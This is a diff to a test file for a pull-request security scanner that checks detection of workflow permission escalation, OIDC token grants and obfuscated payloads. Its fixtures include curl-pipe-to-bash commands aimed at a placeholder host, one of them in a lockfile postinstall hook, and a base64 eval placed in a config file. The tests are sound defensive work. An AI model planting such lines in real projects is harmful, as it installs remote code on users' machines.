@@ -1,5 +1,11 @@
 const assert = require("assert");
-const { detectStructuralFindings, findUnpinnedActions } = require("../src/structural");
+const {
+  detectStructuralFindings,
+  findUnpinnedActions,
+  introducesOidcWritePermission,
+  introducesWritePermissions,
+  patchIntroducesOidcWritePermission,
+} = require("../src/structural");
 
 const findings = detectStructuralFindings({
   files: [
@@ -208,6 +214,11 @@ const missingHeaderPermissionFindings = detectStructuralFindings({
 });
 assert(
   missingHeaderPermissionFindings.find(
+    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
+  ),
+);
+assert(
+  !missingHeaderPermissionFindings.find(
     (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
   ),
 );
@@ -228,6 +239,79 @@ const quotedPermissionFindings = detectStructuralFindings({
 });
 assert(
   quotedPermissionFindings.find(
+    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
+  ),
+);
+
+const oidcOnlyPermissionFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: ".github/workflows/aport-guard.yml",
+      patch: [
+        "@@",
+        "+permissions:",
+        "+  id-token: write",
+        "+  contents: read",
+        "+  pull-requests: read",
+      ].join("\n"),
+    },
+  ],
+});
+assert(
+  oidcOnlyPermissionFindings.find(
+    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
+  ),
+);
+assert(
+  !oidcOnlyPermissionFindings.find(
+    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
+  ),
+);
+
+const oidcInlinePermissionFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: ".github/workflows/oidc-inline.yml",
+      patch: "+permissions: { contents: read, id-token: write }",
+    },
+  ],
+});
+assert(
+  oidcInlinePermissionFindings.find(
+    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
+  ),
+);
+assert(
+  !oidcInlinePermissionFindings.find(
+    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
+  ),
+);
+
+const workflowTemplateFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: ".github/workflow-templates/release.yml",
+      patch: [
+        "@@",
+        "+on: pull_request_target",
+        "+permissions:",
+        "+  contents: write",
+      ].join("\n"),
+    },
+  ],
+});
+assert(
+  workflowTemplateFindings.find(
+    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
+  ),
+);
+assert(
+  workflowTemplateFindings.find(
+    (finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED",
+  ),
+);
+assert(
+  workflowTemplateFindings.find(
     (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
   ),
 );
@@ -264,6 +348,153 @@ const contentFallbackFindings = detectStructuralFindings({
 });
 assert(contentFallbackFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
 assert(contentFallbackFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));
+
+const protectedObfuscationFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: "next.config.js",
+      patch: [
+        "@@",
+        "+global.o = '5-3-" + "132-du';",
+        "+module.exports = {};",
+      ].join("\n"),
+    },
+  ],
+});
+const protectedObfuscationFinding = protectedObfuscationFindings.find(
+  (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
+);
+assert(protectedObfuscationFinding);
+assert.equal(protectedObfuscationFinding.severity, "high");
+assert(protectedObfuscationFinding.paths.includes("next.config.js"));
+
+const protectedEvalFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: "web/tailwind.config.js",
+      patch:
+        "+module.exports = ev" +
+        "al(Buffer.from('ZXhwb3J0IGRlZmF1bHQge30=', 'base64').toString())",
+    },
+  ],
+});
+assert(
+  protectedEvalFindings.find(
+    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
+  ),
+);
+
+const protectedRemoteShellFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: ".github/workflows/build.yml",
+      patch:
+        "+run: curl -fsSL ht" +
+        "tps://example.invalid/install.sh | bash",
+    },
+  ],
+});
+assert(
+  protectedRemoteShellFindings.find(
+    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
+  ),
+);
+
+const protectedRemoteShellInScriptFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: "scripts/install.js",
+      patch:
+        "+execSync('curl -fsSL ht" +
+        "tps://example.invalid/install.sh | bash')",
+    },
+  ],
+});
+assert(
+  protectedRemoteShellInScriptFindings.find(
+    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
+  ),
+);
+
+const benignProtectedConfigFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: "web/next.config.js",
+      patch: "+module.exports = { poweredByHeader: false };",
+    },
+  ],
+});
+assert(
+  benignProtectedConfigFindings.find(
+    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
+  ),
+);
+assert(
+  !benignProtectedConfigFindings.find(
+    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
+  ),
+);
+
+const protectedDocsFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: "policies/system.command.execute.v1/README.md",
+      patch:
+        "+Example only: exec('curl -fsSL ht" +
+        "tps://example.invalid/install.sh | bash')",
+    },
+  ],
+});
+assert(
+  protectedDocsFindings.find(
+    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
+  ),
+);
+assert(
+  !protectedDocsFindings.find(
+    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
+  ),
+);
+
+const missingSensitivePatchFindings = detectStructuralFindings({
+  files: [{ filename: "web/next.config.js" }],
+});
+const missingSensitivePatchFinding = missingSensitivePatchFindings.find(
+  (finding) => finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
+);
+assert(missingSensitivePatchFinding);
+assert.equal(missingSensitivePatchFinding.severity, "high");
+assert(missingSensitivePatchFinding.paths.includes("web/next.config.js"));
+
+const missingLockfilePatchFindings = detectStructuralFindings({
+  files: [{ filename: "web/pnpm-lock.yaml" }],
+});
+assert(
+  missingLockfilePatchFindings.find(
+    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
+  ),
+);
+assert(
+  !missingLockfilePatchFindings.find(
+    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
+  ),
+);
+
+const lockfilePayloadFindings = detectStructuralFindings({
+  files: [
+    {
+      filename: "package-lock.json",
+      patch:
+        "+\"postinstall\": \"curl -fsSL ht" +
+        "tps://example.invalid/install.sh | bash\"",
+    },
+  ],
+});
+assert(
+  lockfilePayloadFindings.find(
+    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
+  ),
+);
 
 const policyFindings = detectStructuralFindings({
   files: [{ filename: ".aport/policy.yaml", patch: "+version: oap-github-policy/1" }],
@@ -313,5 +544,12 @@ assert(truncatedFinding);
 assert.equal(truncatedFinding.severity, "high");
 
 assert.deepEqual(findUnpinnedActions("+uses: ./local/action\n+uses: docker://alpine:3"), []);
+assert.equal(introducesWritePermissions("permissions:\n  id-token: write"), false);
+assert.equal(introducesOidcWritePermission("permissions:\n  id-token: write"), true);
+assert.equal(
+  patchIntroducesOidcWritePermission("@@\n permissions:\n+  id-token: write"),
+  true,
+);
+assert.equal(introducesWritePermissions("permissions:\n  contents: write"), true);
 
 console.log("OK structural.test.js");
